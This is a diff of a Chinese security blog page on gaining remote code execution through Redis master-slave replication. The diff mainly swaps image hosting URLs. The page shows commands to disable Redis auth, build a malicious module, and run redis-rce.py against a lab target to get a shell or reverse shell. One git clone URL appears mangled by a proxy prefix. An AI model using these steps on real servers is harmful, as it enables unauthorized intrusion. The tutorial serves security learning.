@@ -227,27 +227,27 @@
 <p>高版本默认不允许进行远程连接，需要修改配置文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure>
 <p>注释<br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1gleg4jo4pkj311w0awacl.jpg" alt="image-20201206211526358"></p>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271016519.jpg" alt="image-20201206211526358"></p>
 <p>取消密码认证</p>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1gleg402dfrj30xs09ggoy.jpg" alt="image-20201206211452502"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271016408.jpg" alt="image-20201206211452502"></p>
 <p>重新运行redis</p>
 <p>redis-server redis.conf（源码安装需要指定配置文件进行启动）</p>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1gleg8x0z80j30y80u07f8.jpg" alt="image-20201206211934930"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271016551.jpg" alt="image-20201206211934930"></p>
 <h4 id="4-漏洞利用">4、漏洞利用</h4>
 <p>利用条件：需要redis未授权或者弱口令</p>
 <p>通过python脚本模拟redis服务端，利用主从复制加载外部.so文件，变成redis功能中的一部分，从而实现功能扩展。</p>
 <p>我们编译恶意的.so文件，同步至redis上进而实现恶意代码的功能。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载外部so文件</span><br><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">编译</span><br><span class="line">make（使用MAC系统编译可能无法在src目录下生成so文件）</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1glegtkso4uj30zu0iwajl.jpg" alt="image-20201206213929485"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271017367.jpg" alt="image-20201206213929485"></p>
 <p>使用攻击脚本</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=github.com/Ridter/redis-rce.git</span><br><span class="line">python3 redis-rce.py -r 10.211.55.4 -p 6379 -L 192.168.1.101 -f module.so</span><br></pre></td></tr></table></figure>
 <p>选择shell的交互方式</p>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1glehp3qvdej31d00ps47m.jpg" alt="image-20201206220944389"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271017754.jpg" alt="image-20201206220944389"></p>
 <p>成功执行系统命令（所有执行的命令都会在redis日志中被记录）</p>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1glehxepexzj319w0iutgx.jpg" alt="image-20201206221745699"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271017175.jpg" alt="image-20201206221745699"></p>
 <p>输入r进行反弹shell，我们在测试的时候发现使用反弹shell方式比较容易导致靶机redis服务异常中断，推荐使用shell交互模式。</p>
 <p>查看redis日志可以发现把攻击机当作master机器进行复制扩展</p>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/0081Kckwgy1glei0dpabhj31kk0oi4eb.jpg" alt="image-20201206222037601"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271017619.jpg" alt="image-20201206222037601"></p>
 <p>另外redis主从复制还可以使用手动的方式，本地起恶意的redis服务器，监听本地端口加载exp.so文件。</p>
 
                 
